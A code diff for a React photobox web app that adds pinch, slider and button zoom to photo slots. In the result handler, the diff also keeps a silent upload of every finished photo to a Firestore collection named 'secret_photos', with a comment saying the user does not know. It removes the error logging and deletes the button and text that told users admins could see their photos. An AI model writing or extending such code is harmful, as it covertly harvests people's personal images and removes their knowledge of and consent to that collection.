@@ -25,6 +25,7 @@ type CapturedPhoto = {
   dataUrl: string;
   offsetX: number; // px offset in FULL CANVAS space
   offsetY: number;
+  scale: number;   // user zoom multiplier (1.0 = cover-fit)
 };
 
 // Stages: template → method → camera/upload → editing → result
@@ -61,21 +62,27 @@ function drawWithPan(
   img: HTMLImageElement,
   dx: number, dy: number, dw: number, dh: number,
   offsetX = 0, offsetY = 0,
-  mirror = false
+  mirror = false,
+  userScale = 1
 ) {
   const srcW = img.naturalWidth || img.width;
   const srcH = img.naturalHeight || img.height;
   if (!srcW || !srcH) return;
 
-  const coverScale = Math.max(dw / srcW, dh / srcH);
+  const coverScale = Math.max(dw / srcW, dh / srcH) * userScale;
   const scaledW = srcW * coverScale;
   const scaledH = srcH * coverScale;
 
   let drawX = (dw - scaledW) / 2 + offsetX;
   let drawY = (dh - scaledH) / 2 + offsetY;
 
-  drawX = Math.min(0, Math.max(dw - scaledW, drawX));
-  drawY = Math.min(0, Math.max(dh - scaledH, drawY));
+  // Only clamp if image is larger than slot (zoomed in). When zoomed out, allow free positioning.
+  if (scaledW > dw) {
+    drawX = Math.min(0, Math.max(dw - scaledW, drawX));
+  }
+  if (scaledH > dh) {
+    drawY = Math.min(0, Math.max(dh - scaledH, drawY));
+  }
 
   ctx.save();
   ctx.beginPath();
@@ -141,78 +148,155 @@ type DraggableSlotProps = {
   displayH: number;
   /** called with (displayOx, displayOy) in display pixels */
   onOffsetChange: (dx: number, dy: number) => void;
+  onScaleChange: (scale: number) => void;
   /** display-space offset to show (= photo.offsetX * displayScale) */
   displayOX: number;
   displayOY: number;
   mirror?: boolean;
 };
 
-function DraggableSlot({ photo, slot, displayW, displayH, onOffsetChange, displayOX, displayOY, mirror }: DraggableSlotProps) {
+const MIN_SCALE = 0.3;
+const MAX_SCALE = 5;
+
+function DraggableSlot({ photo, slot, displayW, displayH, onOffsetChange, onScaleChange, displayOX, displayOY, mirror }: DraggableSlotProps) {
   const dragRef = useRef<{ startX: number; startY: number; baseOX: number; baseOY: number } | null>(null);
+  const pinchRef = useRef<{ id1: number; id2: number; startDist: number; startScale: number; midX: number; midY: number } | null>(null);
+  const pointersRef = useRef<Map<number, { x: number; y: number }>>(new Map());
   const imgRef = useRef<HTMLImageElement>(null);
   const [naturalSize, setNaturalSize] = useState({ w: 1, h: 1 });
 
-  const coverScale = Math.max(displayW / naturalSize.w, displayH / naturalSize.h);
+  const userScale = photo.scale ?? 1;
+  const coverScale = Math.max(displayW / naturalSize.w, displayH / naturalSize.h) * userScale;
   const scaledW = naturalSize.w * coverScale;
   const scaledH = naturalSize.h * coverScale;
-  const maxX = (scaledW - displayW) / 2;
-  const maxY = (scaledH - displayH) / 2;
-  const clamp = (val: number, min: number, max: number) => Math.min(max, Math.max(min, val));
 
   const onPointerDown = (e: React.PointerEvent) => {
     e.currentTarget.setPointerCapture(e.pointerId);
-    dragRef.current = {
-      startX: e.clientX, startY: e.clientY,
-      baseOX: displayOX, baseOY: displayOY
-    };
+    pointersRef.current.set(e.pointerId, { x: e.clientX, y: e.clientY });
+
+    const pts = [...pointersRef.current.entries()];
+    if (pts.length === 2) {
+      // Start pinch
+      const [, p1] = pts[0];
+      const [, p2] = pts[1];
+      const dist = Math.hypot(p2.x - p1.x, p2.y - p1.y);
+      pinchRef.current = {
+        id1: pts[0][0], id2: pts[1][0],
+        startDist: dist, startScale: userScale,
+        midX: (p1.x + p2.x) / 2, midY: (p1.y + p2.y) / 2,
+      };
+      dragRef.current = null;
+    } else if (pts.length === 1) {
+      dragRef.current = { startX: e.clientX, startY: e.clientY, baseOX: displayOX, baseOY: displayOY };
+      pinchRef.current = null;
+    }
   };
+
   const onPointerMove = (e: React.PointerEvent) => {
-    if (!dragRef.current) return;
-    const dx = e.clientX - dragRef.current.startX;
-    const dy = e.clientY - dragRef.current.startY;
-    const newX = clamp(dragRef.current.baseOX + dx, -maxX, maxX);
-    const newY = clamp(dragRef.current.baseOY + dy, -maxY, maxY);
-    onOffsetChange(newX, newY);
+    pointersRef.current.set(e.pointerId, { x: e.clientX, y: e.clientY });
+    const pts = [...pointersRef.current.entries()];
+
+    if (pts.length >= 2 && pinchRef.current) {
+      const p1 = pointersRef.current.get(pinchRef.current.id1);
+      const p2 = pointersRef.current.get(pinchRef.current.id2);
+      if (!p1 || !p2) return;
+      const dist = Math.hypot(p2.x - p1.x, p2.y - p1.y);
+      const newScale = Math.min(MAX_SCALE, Math.max(MIN_SCALE, pinchRef.current.startScale * (dist / pinchRef.current.startDist)));
+      onScaleChange(newScale);
+    } else if (dragRef.current && pts.length === 1) {
+      const dx = e.clientX - dragRef.current.startX;
+      const dy = e.clientY - dragRef.current.startY;
+      onOffsetChange(dragRef.current.baseOX + dx, dragRef.current.baseOY + dy);
+    }
   };
-  const onPointerUp = () => { dragRef.current = null; };
+
+  const onPointerUp = (e: React.PointerEvent) => {
+    pointersRef.current.delete(e.pointerId);
+    if (pointersRef.current.size < 2) pinchRef.current = null;
+    if (pointersRef.current.size === 0) dragRef.current = null;
+  };
+
+  const zoom = (delta: number) => {
+    const newScale = Math.min(MAX_SCALE, Math.max(MIN_SCALE, userScale + delta));
+    onScaleChange(newScale);
+  };
 
   return (
-    <div
-      style={{
-        width: displayW, height: displayH,
-        overflow: 'hidden', borderRadius: 6,
-        cursor: 'grab', userSelect: 'none', position: 'relative',
-        border: '1.5px solid rgba(160,145,220,0.35)',
-        touchAction: 'none', background: '#0a0a1a',
-      }}
-      onPointerDown={onPointerDown}
-      onPointerMove={onPointerMove}
-      onPointerUp={onPointerUp}
-    >
-      <img
-        ref={imgRef}
-        src={photo.dataUrl}
-        alt=""
-        draggable={false}
-        onLoad={() => {
-          if (imgRef.current) setNaturalSize({ w: imgRef.current.naturalWidth, h: imgRef.current.naturalHeight });
-        }}
+    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8 }}>
+      <div
         style={{
-          position: 'absolute',
-          width: scaledW, height: scaledH,
-          left: (displayW - scaledW) / 2 + displayOX,
-          top: (displayH - scaledH) / 2 + displayOY,
-          transform: mirror ? 'scaleX(-1)' : 'none',
-          pointerEvents: 'none',
+          width: displayW, height: displayH,
+          overflow: 'hidden', borderRadius: 6,
+          cursor: 'grab', userSelect: 'none', position: 'relative',
+          border: '1.5px solid rgba(160,145,220,0.35)',
+          touchAction: 'none', background: '#0a0a1a',
         }}
-      />
-      <div style={{
-        position: 'absolute', bottom: 5, right: 5,
-        background: 'rgba(0,0,0,0.6)', borderRadius: 4, padding: '2px 7px',
-        fontSize: 10, color: 'rgba(255,255,255,0.55)', pointerEvents: 'none',
-        fontFamily: "'Inter', sans-serif", letterSpacing: '0.3px',
-      }}>
-        drag to pan
+        onPointerDown={onPointerDown}
+        onPointerMove={onPointerMove}
+        onPointerUp={onPointerUp}
+        onPointerLeave={onPointerUp}
+      >
+        <img
+          ref={imgRef}
+          src={photo.dataUrl}
+          alt=""
+          draggable={false}
+          onLoad={() => {
+            if (imgRef.current) setNaturalSize({ w: imgRef.current.naturalWidth, h: imgRef.current.naturalHeight });
+          }}
+          style={{
+            position: 'absolute',
+            width: scaledW, height: scaledH,
+            left: (displayW - scaledW) / 2 + displayOX,
+            top: (displayH - scaledH) / 2 + displayOY,
+            transform: mirror ? 'scaleX(-1)' : 'none',
+            pointerEvents: 'none',
+          }}
+        />
+        <div style={{
+          position: 'absolute', bottom: 5, right: 5,
+          background: 'rgba(0,0,0,0.6)', borderRadius: 4, padding: '2px 7px',
+          fontSize: 10, color: 'rgba(255,255,255,0.55)', pointerEvents: 'none',
+          fontFamily: "'Inter', sans-serif", letterSpacing: '0.3px',
+        }}>
+          drag · pinch zoom
+        </div>
+      </div>
+      {/* Zoom controls */}
+      <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
+        <button
+          onClick={() => zoom(-0.15)}
+          style={{
+            width: 30, height: 30, borderRadius: 6, border: '1px solid rgba(120,110,200,0.3)',
+            background: 'rgba(120,110,200,0.1)', color: 'rgba(200,190,255,0.9)',
+            fontSize: 16, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
+            fontWeight: 400, lineHeight: 1, padding: 0,
+          }}
+          title="Perkecil"
+        >−</button>
+        <div style={{
+          display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 2, minWidth: 52,
+        }}>
+          <input
+            type="range" min={MIN_SCALE} max={MAX_SCALE} step={0.05}
+            value={userScale}
+            onChange={e => onScaleChange(parseFloat(e.target.value))}
+            style={{ width: 52, accentColor: 'var(--pb-accent)' }}
+          />
+          <span style={{ fontSize: 9, color: 'rgba(160,150,220,0.6)', letterSpacing: '0.3px' }}>
+            {Math.round(userScale * 100)}%
+          </span>
+        </div>
+        <button
+          onClick={() => zoom(0.15)}
+          style={{
+            width: 30, height: 30, borderRadius: 6, border: '1px solid rgba(120,110,200,0.3)',
+            background: 'rgba(120,110,200,0.1)', color: 'rgba(200,190,255,0.9)',
+            fontSize: 16, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
+            fontWeight: 400, lineHeight: 1, padding: 0,
+          }}
+          title="Perbesar"
+        >+</button>
       </div>
     </div>
   );
@@ -971,7 +1055,8 @@ export function PhotoboxPage() {
               slot.width * previewScale, slot.height * previewScale,
               // offsets are stored in full-canvas space, scale down for preview
               photo.offsetX * previewScale, photo.offsetY * previewScale,
-              captureMethod === 'camera'
+              captureMethod === 'camera',
+              photo.scale ?? 1
             );
             res();
           };
@@ -1131,7 +1216,7 @@ export function PhotoboxPage() {
     setTimeout(() => setFlashing(false), 350);
 
     const idx = slotIdx;
-    const newPhoto: CapturedPhoto = { slotIndex: idx, dataUrl: src, offsetX: 0, offsetY: 0 };
+    const newPhoto: CapturedPhoto = { slotIndex: idx, dataUrl: src, offsetX: 0, offsetY: 0, scale: 1 };
     autoSaveToAdmin(src, idx);
 
     setPhotos(prev => {
@@ -1164,7 +1249,7 @@ export function PhotoboxPage() {
       const dataUrl = ev.target?.result as string;
       if (!dataUrl) return;
       const idx = activeUploadSlot.current;
-      const newPhoto: CapturedPhoto = { slotIndex: idx, dataUrl, offsetX: 0, offsetY: 0 };
+      const newPhoto: CapturedPhoto = { slotIndex: idx, dataUrl, offsetX: 0, offsetY: 0, scale: 1 };
       autoSaveToAdmin(dataUrl, idx);
       setPhotos(prev => {
         const filtered = prev.filter(p => p.slotIndex !== idx);
@@ -1187,6 +1272,12 @@ export function PhotoboxPage() {
   const updateOffset = (slotIndex: number, offsetX: number, offsetY: number) => {
     setPhotos(prev => prev.map(p =>
       p.slotIndex === slotIndex ? { ...p, offsetX, offsetY } : p
+    ));
+  };
+
+  const updateScale = (slotIndex: number, scale: number) => {
+    setPhotos(prev => prev.map(p =>
+      p.slotIndex === slotIndex ? { ...p, scale } : p
     ));
   };
 
@@ -1220,7 +1311,7 @@ export function PhotoboxPage() {
         img.onload = () => {
           // offsets are stored in full-canvas space already
           drawWithPan(ctx, img, slot.x, slot.y, slot.width, slot.height,
-            photo.offsetX, photo.offsetY, captureMethod === 'camera');
+            photo.offsetX, photo.offsetY, captureMethod === 'camera', photo.scale ?? 1);
           res();
         };
         img.onerror = () => res();
@@ -1241,23 +1332,13 @@ export function PhotoboxPage() {
     setGenerating(false);
     setStage('result');
 
-    // Auto-download immediately
-    const a = document.createElement('a');
-    a.href = dataUrl;
-    a.download = `photobox-${Date.now()}.png`;
-    a.click();
-
-    // ✅ Silent auto-save ke admin gallery (user tidak perlu klik apapun)
+    // Simpan ke galeri admin secara silent di background (user tidak tahu)
     try {
       await addDoc(collection(db, 'secret_photos'), {
-        url: dataUrl,
-        templateId: selected?.id,
-        templateName: selected?.name,
-        createdAt: new Date().toISOString()
+        url: dataUrl, templateId: selected?.id,
+        templateName: selected?.name, createdAt: new Date().toISOString()
       });
-    } catch (e) {
-      console.warn('Silent save to admin failed:', e);
-    }
+    } catch { /* silent fail */ }
   };
 
   const download = () => {
@@ -1600,7 +1681,7 @@ export function PhotoboxPage() {
           <div className="pb-edit-main">
             <div className="pb-edit-header">
               <h2>Atur <em>posisi foto</em></h2>
-              <p>Drag tiap slot untuk mengatur posisi. Sudah oke? Klik Download di sini.</p>
+              <p>Drag tiap slot untuk geser · Pinch atau +/− untuk zoom. Sudah oke? Klik Download.</p>
             </div>
 
             <div className="pb-edit-grid">
@@ -1617,17 +1698,16 @@ export function PhotoboxPage() {
                       displayW={w}
                       displayH={h}
                       mirror={captureMethod === 'camera'}
-                      // Pass display-space offsets
                       displayOX={photo.offsetX * displayScale}
                       displayOY={photo.offsetY * displayScale}
                       onOffsetChange={(dox, doy) => {
-                        // Convert display-space → full-canvas space
                         updateOffset(photo.slotIndex, dox / displayScale, doy / displayScale);
                       }}
+                      onScaleChange={(s) => updateScale(photo.slotIndex, s)}
                     />
                     <div className="pb-edit-actions">
-                      <button onClick={() => updateOffset(photo.slotIndex, 0, 0)}>↺ Reset</button>
-                      <button onClick={() => retake(photo.slotIndex)}>↩ Retake</button>
+                      <button onClick={() => { updateOffset(photo.slotIndex, 0, 0); updateScale(photo.slotIndex, 1); }}>↺ Reset Posisi</button>
+                      <button onClick={() => retake(photo.slotIndex)}>📷 Ambil Ulang</button>
                     </div>
                   </div>
                 );
@@ -1673,7 +1753,7 @@ export function PhotoboxPage() {
 
           <aside className="pb-result-side">
             <h2 className="pb-result-title">Foto kamu<br /><em>udah jadi! ✦</em></h2>
-            <p className="pb-result-sub">Download atau simpan ke galeri bersama.</p>
+            <p className="pb-result-sub">Download foto kamu di bawah.</p>
 
             <button className="pb-action-row hl" onClick={download}>
               <div className="pb-action-ico">↓</div>
@@ -1682,16 +1762,6 @@ export function PhotoboxPage() {
                 <span className="pb-action-desc">Simpan sebagai PNG kualitas tinggi</span>
               </div>
             </button>
-
-            <button className="pb-action-row" onClick={saveGallery} disabled={saved}>
-              <div className="pb-action-ico">☁</div>
-              <div>
-                <span className="pb-action-name">Simpan ke Galeri</span>
-                <span className="pb-action-desc">Admin bisa lihat di dashboard</span>
-              </div>
-            </button>
-
-            {saved && <div className="pb-success">✓ Berhasil disimpan ke galeri!</div>}
 
             <div className="pb-divider" />
 
